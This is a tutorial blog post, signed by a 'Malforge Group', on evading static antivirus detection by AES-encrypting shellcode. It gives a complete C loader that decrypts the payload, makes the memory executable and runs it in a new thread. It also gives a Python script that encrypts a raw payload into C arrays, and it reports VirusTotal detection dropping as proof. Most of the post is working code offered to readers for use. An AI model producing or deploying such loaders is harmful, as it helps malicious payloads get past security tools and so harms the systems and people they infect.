# Antivirus Evasion with AES Encryption

## Introduction

Welcome to this article! Today, we will explore a technique to evade antivirus (AV) detection using AES encryption. This method primarily targets static AV engines by encrypting the shellcode. As a result, static analysis fails to identify the payload as malicious. However, note that dynamic detection might still flag the payload during execution — handling dynamic detection will be discussed in future articles.

The concept is straightforward: the malicious payload is encrypted with AES, making it unreadable to static AV scanners. Only at runtime does the executable decrypt and run the payload, at which point dynamic AVs could still detect it. Nonetheless, this technique successfully bypasses static detection mechanisms.

![image](https://github.com/user-attachments/assets/1fe56867-3d9b-4afc-8928-608a7288847c)

## What is AES Encryption?

You can read more about AES [here](https://cybernews.com/resources/what-is-aes-encryption/).

In short, AES (Advanced Encryption Standard) is a symmetric encryption algorithm, meaning it uses the same key for both encryption and decryption. It operates using a Substitution-Permutation Network (SPN) model and multiple encryption rounds, making it extremely secure.

**Advantages of AES:**
- Relatively simple to understand and implement.
- Very fast encryption and decryption speeds.
- Strong security due to multiple rounds of transformation.
  
![image](https://github.com/user-attachments/assets/cd41e428-2a1d-4543-a7ab-5456ea65d39f)

## Code Example

Here is the C code used in this demonstration:

```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

int AESDecrypt(char *payload, unsigned int payload_len, char *key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int main(void) {
    void *exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    char key[] = { /* your AES key */ };
    unsigned char calc_payload[] = { /* your encrypted payload */ };
    unsigned int calc_len = sizeof(calc_payload);

    // Allocate memory
    exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Decrypt payload
    AESDecrypt((char *)calc_payload, calc_len, key, sizeof(key));

    // Copy decrypted payload to allocated memory
    RtlMoveMemory(exec_mem, calc_payload, calc_len);

    // Change memory protection to executable
    rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

    // Execute the payload
    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }

    return 0;
}
```

### Functions Overview

- **main**: Allocates memory, decrypts the AES-encrypted payload, moves it to executable memory, changes permissions, and executes it.
- **AESDecrypt**: Handles AES decryption using the provided key.

### Payload Encryption Python Script

To encrypt your payload, you can use the following Python script:

```python
import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def aesenc(plaintext, key):
    k = hashlib.sha256(key).digest()
    iv = 16 * '\x00'
    plaintext = pad(plaintext)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(bytes(plaintext, 'latin1'))

try:
    plaintext = open(sys.argv[1], "r").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = aesenc(plaintext, KEY)
print('AESkey[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in KEY.decode('latin1')) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext.decode('latin1')) + ' };')
```

This script:
- Randomly generates an AES key.
- Pads the raw payload.
- Encrypts the payload.
- Outputs C arrays for the AES key and encrypted payload.

Usage:

![image](https://github.com/user-attachments/assets/fbb856d9-26e1-4f11-9b07-b4fe7994fae2)

## Proof of Concept (POC)

To test the payloads, VirusTotal was used:

- **Without AES encryption:** Many AV engines detected the payload.

  ![image](https://github.com/user-attachments/assets/41297594-b74b-4b95-9e60-18b56765c052)

- **With AES encryption:** Static AV detections were significantly reduced.

  ![image](https://github.com/user-attachments/assets/9d336f03-56c3-4d0a-bc86-616fc3a14e02)

## Conclusion

Using AES encryption helps bypass static antivirus detection by hiding the raw payload from basic scanning engines. However, dynamic detection still remains a challenge and will be tackled in future discussions.
Thanks for reading!

— **Malforge Group**

---
